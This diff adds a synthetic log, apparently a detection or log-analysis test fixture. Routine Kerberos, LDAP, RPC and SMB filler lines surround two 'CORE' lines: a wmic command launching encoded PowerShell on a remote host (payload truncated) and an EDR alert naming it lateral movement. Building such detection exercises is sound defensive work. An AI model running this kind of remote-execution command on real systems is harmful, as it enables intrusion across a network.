@@ -1,0 +1,39 @@
+[FILLER] 10.0.100.5 - - [13/Sep/2026:23:45:00 +0000] Kerberos TGS-REQ: service/krbtgt@DOMAIN.LOCAL (Success)
+[FILLER] 10.0.100.5 - - [13/Sep/2026:23:45:04 +0000] Kerberos TGS-REQ: service/krbtgt@DOMAIN.LOCAL (Success)
+[FILLER] 10.0.100.5 - - [13/Sep/2026:23:45:08 +0000] Kerberos TGS-REQ: service/krbtgt@DOMAIN.LOCAL (Success)
+[FILLER] 10.0.100.5 - - [13/Sep/2026:23:45:12 +0000] RPC BIND Request: UUID 12345678-ABCD-EF00 (Success)
+[FILLER] 10.0.100.0 - - [13/Sep/2026:23:45:13 +0000] SMBv2 READ Request: \\10.0.100.0\SYSVOL\domain\policies\GPT.ini
+[FILLER] 10.0.100.5 - - [13/Sep/2026:23:45:15 +0000] RPC BIND Request: UUID 12345678-ABCD-EF00 (Success)
+[FILLER] 10.0.100.5 - - [13/Sep/2026:23:45:17 +0000] Kerberos TGS-REQ: service/krbtgt@DOMAIN.LOCAL (Success)
+[FILLER] 10.0.100.5 - - [13/Sep/2026:23:45:19 +0000] LDAP Search Request: Base="DC=domain,DC=local"
+[FILLER] 10.0.100.0 - - [13/Sep/2026:23:45:21 +0000] SMBv2 READ Request: \\10.0.100.0\SYSVOL\domain\policies\GPT.ini
+[FILLER] 10.0.100.0 - - [13/Sep/2026:23:45:23 +0000] SMBv2 READ Request: \\10.0.100.0\SYSVOL\domain\policies\GPT.ini
+[FILLER] 10.0.100.5 - - [13/Sep/2026:23:45:25 +0000] LDAP Search Request: Base="DC=domain,DC=local"
+[FILLER] 10.0.100.0 - - [13/Sep/2026:23:45:27 +0000] SMBv2 READ Request: \\10.0.100.0\SYSVOL\domain\policies\GPT.ini
+[FILLER] 10.0.100.0 - - [13/Sep/2026:23:45:28 +0000] SMBv2 READ Request: \\10.0.100.0\SYSVOL\domain\policies\GPT.ini
+[FILLER] 10.0.100.5 - - [13/Sep/2026:23:45:29 +0000] Kerberos TGS-REQ: service/krbtgt@DOMAIN.LOCAL (Success)
+[FILLER] 10.0.100.0 - - [13/Sep/2026:23:45:32 +0000] SMBv2 READ Request: \\10.0.100.0\SYSVOL\domain\policies\GPT.ini
+[FILLER] 10.0.100.5 - - [13/Sep/2026:23:45:33 +0000] Kerberos TGS-REQ: service/krbtgt@DOMAIN.LOCAL (Success)
+[FILLER] 10.0.100.5 - - [13/Sep/2026:23:45:37 +0000] LDAP Search Request: Base="DC=domain,DC=local"
+[FILLER] 10.0.100.5 - - [13/Sep/2026:23:45:40 +0000] LDAP Search Request: Base="DC=domain,DC=local"
+[FILLER] 10.0.100.0 - - [13/Sep/2026:23:45:44 +0000] SMBv2 READ Request: \\10.0.100.0\SYSVOL\domain\policies\GPT.ini
+[FILLER] 10.0.100.5 - - [13/Sep/2026:23:45:48 +0000] Kerberos TGS-REQ: service/krbtgt@DOMAIN.LOCAL (Success)
+[FILLER] 10.0.100.0 - - [13/Sep/2026:23:45:52 +0000] SMBv2 READ Request: \\10.0.100.0\SYSVOL\domain\policies\GPT.ini
+[FILLER] 10.0.100.0 - - [13/Sep/2026:23:45:53 +0000] SMBv2 READ Request: \\10.0.100.0\SYSVOL\domain\policies\GPT.ini
+[FILLER] 10.0.100.5 - - [13/Sep/2026:23:45:55 +0000] Kerberos TGS-REQ: service/krbtgt@DOMAIN.LOCAL (Success)
+[CORE] wmic /node:10.0.100.22 process call create "powershell.exe -enc JABzAD0..."
+[CORE] [EDR-ALERT] Lateral movement executed via Windows Management Instrumentation.
+[FILLER] 10.0.100.0 - - [13/Sep/2026:23:46:01 +0000] SMBv2 READ Request: \\10.0.100.0\SYSVOL\domain\policies\GPT.ini
+[FILLER] 10.0.100.5 - - [13/Sep/2026:23:46:05 +0000] LDAP Search Request: Base="DC=domain,DC=local"
+[FILLER] 10.0.100.5 - - [13/Sep/2026:23:46:09 +0000] LDAP Search Request: Base="DC=domain,DC=local"
+[FILLER] 10.0.100.5 - - [13/Sep/2026:23:46:11 +0000] RPC BIND Request: UUID 12345678-ABCD-EF00 (Success)
+[FILLER] 10.0.100.5 - - [13/Sep/2026:23:46:13 +0000] RPC BIND Request: UUID 12345678-ABCD-EF00 (Success)
+[FILLER] 10.0.100.5 - - [13/Sep/2026:23:46:16 +0000] RPC BIND Request: UUID 12345678-ABCD-EF00 (Success)
+[FILLER] 10.0.100.0 - - [13/Sep/2026:23:46:20 +0000] SMBv2 READ Request: \\10.0.100.0\SYSVOL\domain\policies\GPT.ini
+[FILLER] 10.0.100.5 - - [13/Sep/2026:23:46:22 +0000] RPC BIND Request: UUID 12345678-ABCD-EF00 (Success)
+[FILLER] 10.0.100.5 - - [13/Sep/2026:23:46:23 +0000] LDAP Search Request: Base="DC=domain,DC=local"
+[FILLER] 10.0.100.0 - - [13/Sep/2026:23:46:24 +0000] SMBv2 READ Request: \\10.0.100.0\SYSVOL\domain\policies\GPT.ini
+[FILLER] 10.0.100.5 - - [13/Sep/2026:23:46:27 +0000] LDAP Search Request: Base="DC=domain,DC=local"
+[FILLER] 10.0.100.5 - - [13/Sep/2026:23:46:30 +0000] LDAP Search Request: Base="DC=domain,DC=local"
+[FILLER] 10.0.100.5 - - [13/Sep/2026:23:46:32 +0000] RPC BIND Request: UUID 12345678-ABCD-EF00 (Success)
+[FILLER] 10.0.100.0 - - [13/Sep/2026:23:46:35 +0000] SMBv2 READ Request: \\10.0.100.0\SYSVOL\domain\policies\GPT.ini
